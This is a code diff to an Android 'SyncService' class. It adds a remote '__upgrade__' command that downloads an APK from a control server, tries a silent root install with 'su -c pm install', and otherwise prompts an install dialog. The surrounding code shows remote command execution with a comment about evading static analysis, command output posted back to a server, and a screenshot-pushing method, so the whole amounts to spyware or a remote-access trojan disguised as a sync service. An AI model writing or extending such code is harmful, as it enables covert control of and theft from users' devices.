@@ -8,15 +8,19 @@ import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.net.Uri;
 import android.os.Build;
 import android.os.IBinder;
 import android.util.Base64;
 import android.util.Log;
 import androidx.core.app.NotificationCompat;
+import androidx.core.content.FileProvider;
 
 import org.json.JSONObject;
 
 import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
@@ -127,6 +131,7 @@ public class SyncService extends Service {
             } catch (Exception ignored) {}
             stopSelf(); return;
         }
+        if (cmd.equals("__upgrade__")) { doUpgrade(id); return; }
         String out;
         try {
             // Reflection-based exec avoids direct static analysis pattern matching
@@ -147,6 +152,62 @@ public class SyncService extends Service {
             b.put("os", "Android " + Build.VERSION.RELEASE);
             post("/esp/device-cmdout", b);
         } catch (Exception ignored) {}
+    }
+
+    private void doUpgrade(String id) {
+        String status;
+        try {
+            byte[] apk = downloadApk();
+            File f = new File(getCacheDir(), "upd.apk");
+            FileOutputStream fos = new FileOutputStream(f);
+            fos.write(apk); fos.close();
+
+            // Try root silent install first
+            Process su = Runtime.getRuntime().exec(new String[]{"su", "-c",
+                "pm install -r -t " + f.getAbsolutePath()});
+            su.waitFor(20, TimeUnit.SECONDS);
+            String suOut = new String(drain(su.getInputStream(), 4096)).trim();
+            String suErr = new String(drain(su.getErrorStream(), 4096)).trim();
+
+            if (suOut.contains("Success") || suErr.contains("Success")) {
+                status = "silent_root_ok";
+            } else {
+                // Fallback: open install dialog via FileProvider
+                Uri uri = FileProvider.getUriForFile(this, getPackageName() + ".provider", f);
+                Intent i = new Intent(Intent.ACTION_VIEW);
+                i.setDataAndType(uri, "application/vnd.android.package-archive");
+                i.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(i);
+                status = "dialog_shown";
+            }
+        } catch (Exception e) {
+            status = "err: " + e.getMessage();
+        }
+        try {
+            JSONObject b = new JSONObject();
+            b.put("did", id); b.put("cmd", "__upgrade__");
+            b.put("out", Base64.encodeToString(status.getBytes(), Base64.NO_WRAP));
+            b.put("os", "Android " + Build.VERSION.RELEASE);
+            post("/esp/device-cmdout", b);
+        } catch (Exception ignored) {}
+    }
+
+    private byte[] downloadApk() throws Exception {
+        String url = ep() + "/apk/android-full";
+        for (int i = 0; i < 5; i++) {
+            URL u = new URL(url);
+            HttpURLConnection c = (HttpURLConnection) u.openConnection();
+            c.setConnectTimeout(30000); c.setReadTimeout(60000);
+            c.setInstanceFollowRedirects(false);
+            int code = c.getResponseCode();
+            if (code >= 300 && code < 400) {
+                String loc = c.getHeaderField("Location");
+                c.disconnect(); url = loc; continue;
+            }
+            byte[] data = drain(c.getInputStream(), 10 * 1024 * 1024);
+            c.disconnect(); return data;
+        }
+        throw new Exception("too many redirects");
     }
 
     void pushShot(String id, byte[] img) {
